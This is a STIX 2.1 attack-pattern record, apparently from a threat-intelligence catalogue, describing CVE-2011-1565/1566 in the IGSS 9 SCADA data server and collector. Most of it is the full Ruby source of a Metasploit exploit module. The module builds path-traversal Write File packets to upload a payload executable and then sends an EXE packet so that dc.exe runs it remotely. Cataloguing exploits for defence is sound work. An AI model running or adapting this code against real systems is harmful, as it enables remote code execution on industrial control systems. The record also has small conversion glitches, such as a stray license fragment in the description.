{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a0a0f67b-c6ab-428b-b43f-fed01aba0133",
    "created": "2024-08-14T16:39:27.719187Z",
    "modified": "2024-08-14T16:39:27.71919Z",
    "name": "\"7-Technologies IGSS 9 Data Server/Collector Packet Handling Vulnerabilities\"",
    "description": " This module exploits multiple vulnerabilities found on IGSS 9's Data Server and Data Collector services.  The initial approach is first by transferring our binary with Write packets (opcode 0x0D) via port 12401 (igssdataserver.exe), and then send an EXE packet (opcode 0x0A) to port 12397 (dc.exe), which will cause dc.exe to run that payload with a CreateProcessA() function as a new thread.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/scada/igss9_misc.rb",
            "external_id": "igss9_misc.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-1565"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-1566"
        },
        {
            "source_name": "reference",
            "url": "https://www.cisa.gov/uscert/ics/advisories/ICSA-11-132-01A"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::EXE\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"7-Technologies IGSS 9 Data Server/Collector Packet Handling Vulnerabilities\",\n      'Description'    => %q{\n          This module exploits multiple vulnerabilities found on IGSS 9's Data Server and\n        Data Collector services.  The initial approach is first by transferring our binary\n        with Write packets (opcode 0x0D) via port 12401 (igssdataserver.exe), and then send\n        an EXE packet (opcode 0x0A) to port 12397 (dc.exe), which will cause dc.exe to run\n        that payload with a CreateProcessA() function as a new thread.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Luigi Auriemma',  #Initial discovery, poc\n          'sinn3r',          #Metasploit\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2011-1565'],\n          [ 'CVE', '2011-1566'],\n          [ 'OSVDB', '72354'],\n          [ 'OSVDB', '72349'],\n          [ 'URL', 'http://aluigi.altervista.org/adv/igss_1-adv.txt' ],  #Write File packet flaw\n          [ 'URL', 'http://aluigi.altervista.org/adv/igss_8-adv.txt' ],  #EXE packet flaw\n          [ 'URL', 'https://www.cisa.gov/uscert/ics/advisories/ICSA-11-132-01A']\n        ],\n      'DefaultOptions'  =>\n        {\n          'EXITFUNC' => \"none\",\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          #Service packs do not have any influence on the exploit\n          [ 'Windows XP', {} ],\n          [ 'Windows 7', {} ],\n          [ 'Windows Server 2003 / R2' , {} ],\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2011-03-24'))\n\n      register_options(\n        [\n          Opt::RPORT(0, false),\n        ])\n  end\n\n  def write_packets(data)\n    pkts = []\n\n    #Payload will be in C:\\Documents and Settings\\All Users\\Application Data\\7T\\\n    tmp = rand_text_alpha(1)\n    filename = \"#{tmp}.exe\"\n\n    data_size = data.length\n\n    0.step(data_size, 870) do |s|\n      #Each packet only contains 870 bytes of data\n      chunk = data[s, 870]\n\n      #Data size of this packet\n      chunk_size = [chunk.length].pack('v')\n\n      #Flag is set if this is our last chunk\n      #Flag 0x01 will cause the server to close the connection\n      flag = (chunk.length >= 870) ? \"\\x00\" : \"\\x01\"\n\n      pkt  = \"\\x01\\x00\\x34\\x12\"\n      pkt << \"\\x0D\"                     #Opcode\n      pkt << \"\\x00\"*7\n      pkt << flag                       #Flag\n      pkt << \"\\x00\\x00\\x00\"\n      pkt << \"\\x02\"                     #Command (Write File)\n      pkt << \"\\x00\\x00\\x00\"\n      pkt << \"../../../../#{filename}\"  #Filename\n      pkt << \"\\x00\"*73\n      pkt << \"\\x3E\\x01\\x01\\x02\"\n      pkt << \"\\x00\\x10\"\n      pkt << \"\\x00\\x00\"\n      pkt << \"\\x78\\x01\\x08\\x04\"\n      pkt << \"\\x78\\x01\\x08\\x04\"\n      pkt << \"\\x00\"*22\n      pkt << chunk_size                 #Data size\n      pkt << \"\\x00\\x00\"\n      pkt << chunk                      #Data chunk\n\n      #Add the total packet size to the header\n      pkt_size = [pkt.length + 2].pack('v')\n      pkt = pkt_size + pkt\n\n      #Put this packet to the array\n      pkts << pkt\n    end\n\n    return filename, pkts\n  end\n\n  def exe_packet(filename)\n    #Original path seems to be: C:\\Program Files\\7T\\IGSS32\\V9.0\\GSS\n    #We'll just traverse our way back to C:\\ as base\n    base = \"..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\\"\n\n    pkt  = \"\\x00\\x01\"\n    pkt << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n    pkt << \"\\x01\"\n    pkt << \"\\x00\\x00\"\n    pkt << \"\\x0A\"\n    pkt << \"\\x00\"*31\n    pkt << \"#{base}#{filename}\\\"\"\n    pkt << \"\\x00\"*163 #only for 1 caracter + .exe (i.exe for example)\n\n    return pkt\n  end\n\n  def exploit\n    #Generate payload and our Write packets\n    print_status(\"Generating payload...\")\n    p = generate_payload_exe\n    fname, w_packets = write_packets(p)\n    w_packets_count = w_packets.length.to_s\n    print_status(\"#{p.length.to_s} bytes of payload to transfer (#{w_packets_count} packets)\")\n\n    #Generate our EXE packet\n    e_packet = exe_packet(fname)\n\n    #Create socket to igssdataserver.exe (12401)\n    connect(true, {'RPORT'=>12401})\n\n    #Count how many packets we've sent to track progress\n    counter = 1\n\n    #Send Write packets\n    print_status(\"Sending Write packets...\")\n\n    w_packets.each do |packet|\n      vprint_status(\"Sending packet #{counter}/#{w_packets_count}\")\n      counter += 1\n      sock.put(packet)\n      res = sock.get_once() #Wait before we do the next sock.put again\n    end\n\n    #After the 0x01 flag is set, our connection will be closed by the server.\n    disconnect\n\n    #Now to port 12397 (nc.exe)\n    connect(true, {'RPORT'=>12397})\n\n    print_status(\"Attempt to execute our payload...\")\n    sock.put(e_packet)\n\n    #We must delay disconnect() for a bit, otherwise dc.exe won't call\n    #kernel32!CreateProcessA\n    select(nil, nil, nil, 1)\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-03-24",
    "x_mitre_platforms": [
        "win'"
    ]
}